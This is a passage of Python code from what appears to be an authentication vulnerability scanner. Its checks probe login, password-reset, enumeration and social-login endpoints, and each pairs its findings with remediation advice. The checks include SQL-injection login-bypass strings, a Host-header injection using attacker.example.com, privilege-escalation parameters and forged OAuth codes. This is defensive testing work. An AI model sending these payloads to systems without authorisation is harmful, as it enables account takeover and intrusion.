    _PROTO = "Password Page"
    _TITLE = "SQL Injection in Authentication Fields"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "\" OR \"1\"=\"1",
            "') OR ('1'='1",
        ]
        error_patterns = [
            "sql", "mysql", "ora-", "sqlstate", "syntax error",
            "unterminated", "jdbc", "odbc", "microsoft ole db",
            "pg::", "sqlite", "pdo::", "javax.naming",
        ]
        for payload in sqli_payloads:
            form_data = {
                "username": "admin",
                "password": payload,
                "email": "admin@test.com",
                "user": "admin",
            }
            try:
                r = s.post(target.url, data=form_data, timeout=timeout)
                body_lower = r.text.lower()
                for pat in error_patterns:
                    if pat in body_lower:
                        return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 9.8,
                                  "T1190", "Exploit Public-Facing Application",
                                  "CWE-89", "A03:2021", "CB-3.3", "PTES-6.2",
                                  f"SQL error pattern {pat!r} in response to "
                                  f"payload {payload!r}. DB error: "
                                  + body_lower[
                                      body_lower.index(pat):
                                      body_lower.index(pat)+100
                                  ],
                                  "Use parameterised queries / prepared statements. "
                                  "Suppress database error messages in production.",
                                  refs=["OWASP WSTG-INPV-05",
                                        "CWE-89 SQL Injection"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 9.8,
                  "T1190", "Exploit Public-Facing Application",
                  "CWE-89", "A03:2021", "CB-3.3", "PTES-6.2",
                  "No SQL error patterns detected in response to injection payloads.",
                  "Continue using parameterised queries.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pp02(target: AuthTarget, timeout: int) -> AuthFinding:
    """PP-02: Username Enumeration via Timing"""
    _CID = "PP-02"
    _PROTO = "Password Page"
    _TITLE = "Username Enumeration via Timing / Response"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        fake_user = "xX_definitely_not_real_user_xyz987_Xx"
        common_user = "admin"
        pw = "wrong_password_xyz_987"
        times = {}
        bodies = {}
        for user in [fake_user, common_user]:
            start = time.monotonic()
            try:
                r = s.post(target.url,
                           data={"username": user, "password": pw,
                                 "email": user},
                           timeout=timeout)
                elapsed = time.monotonic() - start
                times[user] = elapsed
                bodies[user] = r.text.lower()
            except Exception:
                times[user] = 0.0
                bodies[user] = ""
        delta = abs(times[fake_user] - times[common_user])
        body_diff = bodies[fake_user] != bodies[common_user]
        issues = []
        if delta > 0.15:
            issues.append(
                f"Response time delta {delta:.3f}s between valid "
                f"({common_user!r}, {times[common_user]:.3f}s) and "
                f"invalid ({fake_user!r}, {times[fake_user]:.3f}s) username"
            )
        if body_diff:
            issues.append(
                "Different response body for valid vs invalid username"
            )
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.3,
                      "T1592", "Gather Victim Host Information",
                      "CWE-203", "A07:2021", "CB-3.5", "PTES-6.1",
                      "; ".join(issues),
                      "Return identical error messages and response times "
                      "for valid and invalid usernames. "
                      "Use constant-time comparison for credential validation.",
                      refs=["OWASP WSTG-ATHN-04"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.3,
                  "T1592", "Gather Victim Host Information",
                  "CWE-203", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Response time delta {delta:.3f}s (<150ms) and "
                  "identical response bodies for valid/invalid usernames.",
                  "Maintain consistent responses to prevent enumeration.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pp03(target: AuthTarget, timeout: int) -> AuthFinding:
    """PP-03: HTTP Method Override"""
    _CID = "PP-03"
    _PROTO = "Password Page"
    _TITLE = "HTTP Method Override"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        issues = []
        for override_header in ["X-HTTP-Method-Override", "X-Method-Override",
                                 "X-HTTP-Method"]:
            for method in ["PUT", "DELETE", "PATCH"]:
                s.headers[override_header] = method
                try:
                    r = s.post(target.url, timeout=timeout,
                               allow_redirects=False)
                    if r.status_code not in (405, 501):
                        issues.append(
                            f"{override_header}: {method} -> HTTP {r.status_code}"
                        )
                except Exception:
                    pass
                del s.headers[override_header]
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 5.3,
                      "T1190", "Exploit Public-Facing Application",
                      "CWE-749", "A05:2021", "CB-3.1", "PTES-6.1",
                      "Server honours method override headers: "
                      + "; ".join(issues[:3]),
                      "Reject or ignore X-HTTP-Method-Override headers on "
                      "authentication endpoints.",
                      refs=["OWASP WSTG-CONF-06"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 5.3,
                  "T1190", "Exploit Public-Facing Application",
                  "CWE-749", "A05:2021", "CB-3.1", "PTES-6.1",
                  "Server correctly rejected method override attempts (HTTP 405/501).",
                  "Maintain method override rejection.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pp04(target: AuthTarget, timeout: int) -> AuthFinding:
    """PP-04: Mass Assignment / Privilege Injection"""
    _CID = "PP-04"
    _PROTO = "Password Page"
    _TITLE = "Mass Assignment / Privilege Escalation via Login"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        priv_params = {
            "username": target.username or "testuser",
            "password": target.password or "testpass",
            "role": "admin",
            "is_admin": "true",
            "admin": "1",
            "privilege": "superuser",
            "group": "administrators",
        }
        r = s.post(target.url, data=priv_params, timeout=timeout,
                   allow_redirects=False)
        if r.status_code == 200 and any(
            kw in r.text.lower() for kw in
            ["dashboard", "welcome", "admin panel", "administrator"]
        ):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.5,
                      "T1548", "Abuse Elevation Control Mechanism",
                      "CWE-915", "A08:2021", "CB-3.5", "PTES-6.1",
                      "Server accepted mass-assignment privilege parameters "
                      "in login POST body and returned admin-like content.",
                      "Use a strict allowlist of accepted POST parameters. "
                      "Never trust client-supplied role or privilege fields.",
                      refs=["OWASP Mass Assignment Cheatsheet"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.5,
                  "T1548", "Abuse Elevation Control Mechanism",
                  "CWE-915", "A08:2021", "CB-3.5", "PTES-6.1",
                  "Server did not grant elevated access from mass-assignment params.",
                  "Maintain strict parameter allowlist.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pp05(target: AuthTarget, timeout: int) -> AuthFinding:
    """PP-05: CAPTCHA Bypass"""
    _CID = "PP-05"
    _PROTO = "Password Page"
    _TITLE = "CAPTCHA Bypass (Missing Validation)"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout)
        has_captcha = any(kw in r.text.lower() for kw in
                          ["captcha", "recaptcha", "g-recaptcha", "h-captcha",
                           "cf-turnstile"])
        if not has_captcha:
            return _na(_CID, _PROTO, _TITLE)
        no_captcha_data = {
            "username": "admin",
            "password": "wrong_password_xyz",
        }
        r2 = s.post(target.url, data=no_captcha_data, timeout=timeout,
                    allow_redirects=False)
        if r2.status_code not in (400, 403, 422, 429):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.3,
                      "T1110", "Brute Force",
                      "CWE-804", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Login POST without CAPTCHA token returned HTTP "
                      f"{r2.status_code} (expected 400/403/422/429). "
                      "CAPTCHA may not be validated server-side.",
                      "Validate CAPTCHA response server-side on every login "
                      "attempt. Reject requests missing the CAPTCHA token.",
                      refs=["OWASP WSTG-ATHN-03"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.3,
                  "T1110", "Brute Force",
                  "CWE-804", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Server rejected login without CAPTCHA token "
                  f"(HTTP {r2.status_code}).",
                  "Maintain CAPTCHA server-side validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pp06(target: AuthTarget, timeout: int) -> AuthFinding:
    """PP-06: Response Body Boolean Manipulation"""
    _CID = "PP-06"
    _PROTO = "Password Page"
    _TITLE = "Response Body Boolean Manipulation"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.post(target.url,
                   data={"username": "admin", "password": "wrongpassword"},
                   json={"username": "admin", "password": "wrongpassword"},
                   timeout=timeout)
        body = r.text
        try:
            data = r.json()
            bool_fields = {
                k: v for k, v in data.items()
                if isinstance(v, bool) and k.lower() in
                ("success", "authenticated", "isloggedin", "error",
                 "ok", "result", "authorized")
            }
            if bool_fields:
                return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                          "T1565.002", "Transmitted Data Manipulation",
                          "CWE-807", "A07:2021", "CB-3.5", "PTES-6.1",
                          f"Authentication response contains manipulable boolean "
                          f"fields: {bool_fields}. A proxy (Burp/ZAP) can flip "
                          "these values to bypass client-side auth checks.",
                          "Perform all authentication decisions server-side. "
                          "Never rely on client-readable boolean fields for "
                          "access control.",
                          refs=["OWASP WSTG-ATHN-01"])
        except Exception:
            pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1565.002", "Transmitted Data Manipulation",
                  "CWE-807", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Response does not contain manipulable boolean auth fields.",
                  "Continue using server-side session management.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# PR -- Password Reset (5 checks)
# ---------------------------------------------------------------------------

def _check_pr01(target: AuthTarget, timeout: int) -> AuthFinding:
    """PR-01: Host Header Injection in Password Reset"""
    _CID = "PR-01"
    _PROTO = "Password Reset"
    _TITLE = "Host Header Injection in Password Reset"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        reset_paths = ["/forgot", "/forgot-password", "/reset",
                       "/password-reset", "/account/recover",
                       "/auth/forgot", "/users/password"]
        reset_url = None
        for p in reset_paths:
            try:
                r = s.get(base + p, timeout=timeout, allow_redirects=False)
                if r.status_code in (200, 301, 302):
                    reset_url = base + p
                    break
            except Exception:
                pass
        if not reset_url:
            r0 = s.get(target.url, timeout=timeout)
            for link_re in [r'href=["\']([^"\']*forgot[^"\']*)["\']',
                            r'href=["\']([^"\']*reset[^"\']*)["\']']:
                m = re.search(link_re, r0.text, re.IGNORECASE)
                if m:
                    href = m.group(1)
                    if href.startswith("http"):
                        reset_url = href
                    else:
                        reset_url = base + href
                    break
        if not reset_url:
            return _na(_CID, _PROTO, _TITLE)
        attacker_host = "attacker.example.com"
        s2 = _session(target)
        s2.headers["Host"] = attacker_host
        s2.headers["X-Forwarded-Host"] = attacker_host
        r = s2.post(reset_url,
                    data={"email": "test@example.com",
                          "username": "test"},
                    timeout=timeout,
                    allow_redirects=False)
        if attacker_host in r.text or attacker_host in r.headers.get(
            "Location", ""
        ):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                      "T1598", "Phishing for Information",
                      "CWE-644", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Reset endpoint {reset_url!r} reflects attacker-controlled "
                      "host in response. Reset link emails would point to "
                      f"{attacker_host!r}, enabling account takeover.",
                      "Use a hardcoded base URL from server configuration for "
                      "password reset links. Never derive the reset URL from "
                      "Host/X-Forwarded-Host request headers.",
                      refs=["OWASP WSTG-ATHN-09", "SkeletonScribe HHI"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1598", "Phishing for Information",
                  "CWE-644", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Reset endpoint did not reflect attacker host in response.",
                  "Maintain hardcoded base URL for reset links.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pr02(target: AuthTarget, timeout: int) -> AuthFinding:
    """PR-02: Reset Token in URL"""
    _CID = "PR-02"
    _PROTO = "Password Reset"
    _TITLE = "Password Reset Token Exposure in URL"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        token_keys = [k for k in params if k.lower() in
                      ("token", "reset_token", "key", "code", "t", "hash")]
        if not token_keys:
            return _na(_CID, _PROTO, _TITLE)
        token_val = params[token_keys[0]]
        entropy_issues = []
        if len(token_val) < 32:
            entropy_issues.append(
                f"Token length {len(token_val)} < 32 chars (low entropy)"
            )
        if token_val.isdigit():
            entropy_issues.append("Token is all-numeric (low entropy)")
        if re.match(r"^\d+$", token_val):
            entropy_issues.append("Numeric-only token is easily brute-forceable")
        return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 6.5,
                  "T1098", "Account Manipulation",
                  "CWE-598", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Reset token {token_keys[0]!r}={token_val[:20]}... "
                  "present in URL query string. Exposed to Referer headers, "
                  "browser history and server logs."
                  + (" Issues: " + "; ".join(entropy_issues)
                     if entropy_issues else ""),
                  "Deliver reset tokens via email body (not URL) or use POST. "
                  "Use 256-bit cryptographically random tokens. "
                  "Tokens must expire within 15 minutes.",
                  refs=["OWASP WSTG-ATHN-09", "NIST 800-63B S5.1.1.2"])
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pr03(target: AuthTarget, timeout: int) -> AuthFinding:
    """PR-03: Reset Token Predictability"""
    _CID = "PR-03"
    _PROTO = "Password Reset"
    _TITLE = "Password Reset Token Predictability"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        reset_paths = ["/forgot", "/forgot-password", "/reset",
                       "/password-reset", "/auth/forgot"]
        reset_url = None
        for p in reset_paths:
            try:
                r = s.get(base + p, timeout=timeout, allow_redirects=False)
                if r.status_code in (200,):
                    reset_url = base + p
                    break
            except Exception:
                pass
        if not reset_url:
            return _na(_CID, _PROTO, _TITLE)
        tokens = []
        for _ in range(3):
            try:
                r = s.post(reset_url,
                           data={"email": f"pen_test_{int(time.time())}@example.com"},
                           timeout=timeout)
                tok_match = re.search(
                    r'token[=:\s"\']+([A-Za-z0-9+/=_-]{16,})', r.text
                )
                if tok_match:
                    tokens.append(tok_match.group(1))
                time.sleep(0.3)
            except Exception:
                pass
        if len(tokens) < 2:
            return _na(_CID, _PROTO, _TITLE)
        sequential = all(tokens[i] < tokens[i+1] for i in range(len(tokens)-1))
        too_short = any(len(t) < 32 for t in tokens)
        if sequential or too_short:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                      "T1098", "Account Manipulation",
                      "CWE-340", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"Reset tokens show predictability: sequential={sequential}, "
                      f"short_token={too_short}. Tokens: "
                      + ", ".join(t[:20] for t in tokens),
                      "Use os.urandom(32) or equivalent cryptographic RNG "
                      "for reset token generation. Minimum 256-bit entropy.",
                      refs=["OWASP WSTG-ATHN-09", "NIST 800-63B"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1098", "Account Manipulation",
                  "CWE-340", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Reset tokens appear sufficiently random and non-sequential.",
                  "Continue using cryptographic RNG for token generation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pr04(target: AuthTarget, timeout: int) -> AuthFinding:
    """PR-04: Password Reset IDOR (Email Parameter Manipulation)"""
    _CID = "PR-04"
    _PROTO = "Password Reset"
    _TITLE = "Password Reset IDOR via Email Parameter"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        reset_paths = ["/forgot", "/forgot-password", "/password-reset",
                       "/auth/forgot", "/reset"]
        reset_url = None
        for p in reset_paths:
            try:
                r = s.get(base + p, timeout=timeout, allow_redirects=False)
                if r.status_code == 200:
                    reset_url = base + p
                    break
            except Exception:
                pass
        if not reset_url:
            return _na(_CID, _PROTO, _TITLE)
        test_emails = [
            "victim@example.com",
            "admin@" + (urllib.parse.urlparse(target.url).netloc or "example.com"),
        ]
        found = []
        for email in test_emails:
            try:
                r = s.post(reset_url, data={"email": email}, timeout=timeout)
                if r.status_code == 200 and any(
                    kw in r.text.lower() for kw in
                    ["sent", "check your email", "email sent", "reset link",
                     "instructions"]
                ):
                    found.append(
                        f"email={email!r} -> server confirms email sent "
                        f"(HTTP {r.status_code})"
                    )
            except Exception:
                pass
        if len(found) >= 2:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 8.8,
                      "T1098", "Account Manipulation",
                      "CWE-639", "A01:2021", "CB-3.5", "PTES-6.1",
                      "Server initiates password reset for arbitrary email addresses "
                      "without ownership verification: " + "; ".join(found),
                      "Rate-limit password reset requests per IP and per account. "
                      "Do not confirm whether an email address exists in the system.",
                      refs=["OWASP WSTG-ATHN-09"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 8.8,
                  "T1098", "Account Manipulation",
                  "CWE-639", "A01:2021", "CB-3.5", "PTES-6.1",
                  "Reset endpoint did not confirm reset for arbitrary addresses.",
                  "Maintain ambiguous reset confirmation messages.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_pr05(target: AuthTarget, timeout: int) -> AuthFinding:
    """PR-05: No Rate Limiting on Password Reset"""
    _CID = "PR-05"
    _PROTO = "Password Reset"
    _TITLE = "No Rate Limiting on Password Reset"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        reset_paths = ["/forgot", "/forgot-password", "/password-reset"]
        reset_url = None
        for p in reset_paths:
            try:
                r = s.get(base + p, timeout=timeout, allow_redirects=False)
                if r.status_code == 200:
                    reset_url = base + p
                    break
            except Exception:
                pass
        if not reset_url:
            return _na(_CID, _PROTO, _TITLE)
        codes = []
        for _ in range(5):
            try:
                r = s.post(reset_url,
                           data={"email": "ratelimit_test@example.com"},
                           timeout=timeout)
                codes.append(r.status_code)
            except Exception:
                codes.append(0)
        if 429 not in codes and all(c in (200, 302) for c in codes if c):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.3,
                      "T1110", "Brute Force",
                      "CWE-307", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"5 rapid reset requests all returned {set(codes)} with "
                      "no rate limiting (429) or lockout detected.",
                      "Implement rate limiting (e.g. 3 requests/hour/IP) on "
                      "password reset endpoints. Return HTTP 429 when exceeded.",
                      refs=["OWASP WSTG-ATHN-03", "NIST 800-63B"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.3,
                  "T1110", "Brute Force",
                  "CWE-307", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Rate limiting detected (HTTP 429 received after "
                  f"{codes.index(429)+1} requests).",
                  "Maintain rate limiting on password reset endpoints.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# EN -- Account Enumeration (4 checks)
# ---------------------------------------------------------------------------

def _check_en01(target: AuthTarget, timeout: int) -> AuthFinding:
    """EN-01: Login Error Message Enumeration"""
    _CID = "EN-01"
    _PROTO = "Enumeration"
    _TITLE = "Account Enumeration via Login Error Messages"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        fake = "xX_definitely_not_real_user_xyz987_Xx"
        real_candidates = ["admin", "administrator", "root"]
        pw = "wrong_pass_xyz_987"
        def _try(user):
            try:
                r = s.post(target.url,
                           data={"username": user, "password": pw,
                                 "email": user},
                           timeout=timeout)
                return r.status_code, r.text.lower()[:300]
            except Exception:
                return 0, ""
        fc, fb = _try(fake)
        real_results = [_try(u) for u in real_candidates]
        diffs = []
        for i, (rc, rb) in enumerate(real_results):
            if rc != fc or rb != fb:
                if rc != fc:
                    diffs.append(
                        f"HTTP {fc} (fake) vs HTTP {rc} ({real_candidates[i]})"
                    )
                if rb != fb:
                    user_err = "user" in rb and "user" not in fb
                    pass_err = "password" in rb and "password" not in fb
                    if user_err:
                        diffs.append(
                            f"Response for {real_candidates[i]!r} contains "
                            "'user' error (enumerable)"
                        )
                    if pass_err:
                        diffs.append(
                            f"Response for {real_candidates[i]!r} contains "
                            "'password' error (suggests valid username)"
                        )
        if diffs:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.3,
                      "T1592", "Gather Victim Host Information",
                      "CWE-204", "A07:2021", "CB-3.5", "PTES-5.3",
                      "Different error messages/codes for valid vs invalid "
                      "usernames: " + "; ".join(diffs[:3]),
                      "Return the same error message for all failed login "
                      "attempts regardless of whether the username exists: "
                      "'Invalid username or password.'",
                      refs=["OWASP WSTG-ATHN-04"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.3,
                  "T1592", "Gather Victim Host Information",
                  "CWE-204", "A07:2021", "CB-3.5", "PTES-5.3",
                  "Server returns consistent error messages for valid/invalid "
                  "usernames.",
                  "Maintain consistent error message policy.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_en02(target: AuthTarget, timeout: int) -> AuthFinding:
    """EN-02: Registration Form Enumeration"""
    _CID = "EN-02"
    _PROTO = "Enumeration"
    _TITLE = "Account Enumeration via Registration Form"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        reg_paths = ["/register", "/signup", "/sign-up",
                     "/create-account", "/join", "/new-account"]
        reg_url = None
        for p in reg_paths:
            try:
                r = s.get(base + p, timeout=timeout, allow_redirects=False)
                if r.status_code in (200,):
                    reg_url = base + p
                    break
            except Exception:
                pass
        if not reg_url:
            return _na(_CID, _PROTO, _TITLE)
        domain = urllib.parse.urlparse(target.url).netloc or "example.com"
        common_emails = [f"admin@{domain}", f"test@{domain}"]
        enum_results = []
        for email in common_emails:
            try:
                r = s.post(reg_url,
                           data={"email": email, "username": email.split("@")[0],
                                 "password": "Test_Pass_123!", "confirm": "Test_Pass_123!"},
                           timeout=timeout)
                body_lower = r.text.lower()
                if any(kw in body_lower for kw in
                       ["already", "taken", "exists", "in use", "registered"]):
                    enum_results.append(
                        f"{email!r} exists (response: "
                        + body_lower[
                            max(0, next((body_lower.index(kw) for kw in
                                ["already", "taken", "exists", "in use", "registered"]
                                if kw in body_lower), 0)):
                        ][:80] + ")"
                    )
            except Exception:
                pass
        if enum_results:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 4.3,
                      "T1592", "Gather Victim Host Information",
                      "CWE-204", "A07:2021", "CB-3.5", "PTES-5.3",
                      "Registration form reveals existing accounts: "
                      + "; ".join(enum_results[:3]),
                      "Return the same response regardless of whether the "
                      "email/username exists: 'If this email is not registered, "
                      "a confirmation will be sent.'",
                      refs=["OWASP WSTG-ATHN-04"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 4.3,
                  "T1592", "Gather Victim Host Information",
                  "CWE-204", "A07:2021", "CB-3.5", "PTES-5.3",
                  "Registration form does not reveal existing account status.",
                  "Maintain ambiguous registration messages.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_en03(target: AuthTarget, timeout: int) -> AuthFinding:
    """EN-03: Rate Limiting on Login Endpoint"""
    _CID = "EN-03"
    _PROTO = "Enumeration"
    _TITLE = "No Rate Limiting on Login / Brute Force Protection"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        codes = []
        for i in range(10):
            try:
                r = s.post(target.url,
                           data={"username": "admin",
                                 "password": f"wrong_pass_{i}"},
                           timeout=timeout)
                codes.append(r.status_code)
                if r.status_code == 429:
                    break
            except Exception:
                codes.append(0)
        if 429 not in codes and 403 not in codes:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.5,
                      "T1110.001", "Brute Force: Password Guessing",
                      "CWE-307", "A07:2021", "CB-3.5", "PTES-6.1",
                      f"10 rapid login attempts returned {set(codes)} with no "
                      "rate limiting (429) or lockout (403) detected. "
                      "Brute force attack is feasible.",
                      "Implement progressive delays, account lockout after "
                      "N failures, and IP-based rate limiting (HTTP 429). "
                      "Consider CAPTCHA after 3 failed attempts.",
                      refs=["OWASP WSTG-ATHN-03", "NIST 800-63B S5.2.2"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.5,
                  "T1110.001", "Brute Force: Password Guessing",
                  "CWE-307", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Rate limiting detected (status {set(codes)}).",
                  "Maintain brute force protection.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_en04(target: AuthTarget, timeout: int) -> AuthFinding:
    """EN-04: Username Enumeration via HTTP Status Code"""
    _CID = "EN-04"
    _PROTO = "Enumeration"
    _TITLE = "Username Enumeration via HTTP Status Code"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        fake = "xX_definitely_not_real_xyz987_Xx"
        pw = "wrong_pass_xyz_987"
        def _status(user):
            try:
                r = s.post(target.url,
                           data={"username": user, "password": pw},
                           timeout=timeout)
                return r.status_code
            except Exception:
                return 0
        fake_code = _status(fake)
        real_code = _status("admin")
        if fake_code != real_code and fake_code != 0 and real_code != 0:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 4.3,
                      "T1592", "Gather Victim Host Information",
                      "CWE-204", "A07:2021", "CB-3.5", "PTES-5.3",
                      f"Different HTTP status codes for valid vs invalid username: "
                      f"fake={fake_code}, admin={real_code}",
                      "Return the same HTTP status code (200 or 401) for all "
                      "failed login attempts.",
                      refs=["OWASP WSTG-ATHN-04"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 4.3,
                  "T1592", "Gather Victim Host Information",
                  "CWE-204", "A07:2021", "CB-3.5", "PTES-5.3",
                  f"Consistent HTTP {fake_code} for both valid and invalid "
                  "usernames.",
                  "Maintain consistent HTTP status codes for auth failures.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# SL -- Social Login (4 checks)
# ---------------------------------------------------------------------------

def _check_sl01(target: AuthTarget, timeout: int) -> AuthFinding:
    """SL-01: Social Login OAuth State Parameter Missing"""
    _CID = "SL-01"
    _PROTO = "Social Login"
    _TITLE = "Social Login OAuth State Parameter Missing"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout)
        providers = {
            "google": ["/auth/google", "/oauth/google", "/login/google"],
            "microsoft": ["/auth/microsoft", "/oauth/microsoft", "/login/azure"],
            "github": ["/auth/github", "/oauth/github", "/login/github"],
        }
        base = target.base_url
        found_issues = []
        for provider, paths in providers.items():
            for path in paths:
                link_re = re.compile(
                    r'href=["\']([^"\']*' + provider + r'[^"\']*)["\']',
                    re.IGNORECASE
                )
                m = link_re.search(r.text)
                test_url = None
                if m:
                    href = m.group(1)
                    test_url = href if href.startswith("http") else base + href
                else:
                    try:
                        rp = s.get(base + path, timeout=timeout,
                                   allow_redirects=False)
                        if rp.status_code in (301, 302):
                            loc = rp.headers.get("Location", "")
                            if provider in loc.lower() or "oauth" in loc.lower():
                                test_url = loc
                    except Exception:
                        pass
                if test_url:
                    parsed_social = urllib.parse.urlparse(test_url)
                    params = dict(urllib.parse.parse_qsl(parsed_social.query))
                    if "state" not in params:
                        found_issues.append(
                            f"{provider} OAuth URL missing state: {test_url[:80]}"
                        )
                    break
        if found_issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-352", "A07:2021", "CB-3.5", "PTES-6.1",
                      "; ".join(found_issues),
                      "Add a cryptographically random state parameter to all "
                      "social OAuth2 authorization requests and validate it on "
                      "the callback.",
                      refs=["RFC 6749 S10.12"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-352", "A07:2021", "CB-3.5", "PTES-6.1",
                  "No social login endpoints found missing state parameter.",
                  "Maintain state parameter enforcement on social OAuth flows.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_sl02(target: AuthTarget, timeout: int) -> AuthFinding:
    """SL-02: Social Login Callback Without Verification"""
    _CID = "SL-02"
    _PROTO = "Social Login"
    _TITLE = "Social Login Callback Without Provider Verification"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        callback_paths = [
            "/auth/google/callback", "/auth/github/callback",
            "/auth/microsoft/callback", "/oauth/callback",
            "/social/callback", "/auth/callback",
        ]
        vulnerable = []
        for path in callback_paths:
            try:
                r = s.get(
                    base + path + "?code=FAKE_CODE_EXPSTRIKE&state=FAKE_STATE",
                    timeout=timeout, allow_redirects=False
                )
                if r.status_code == 200 and any(
                    kw in r.text.lower() for kw in
                    ["welcome", "dashboard", "logged in", "success"]
                ):
                    vulnerable.append(
                        f"{path} (HTTP 200 with auth content for fake code)"
                    )
            except Exception:
                pass
        if vulnerable:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 9.1,
                      "T1078", "Valid Accounts",
                      "CWE-287", "A07:2021", "CB-3.5", "PTES-6.1",
                      "Social login callback accepts fabricated codes: "
                      + "; ".join(vulnerable),
                      "Always exchange the code for a token via the provider's "
                      "token endpoint and validate the returned identity token "
                      "before creating a session.",
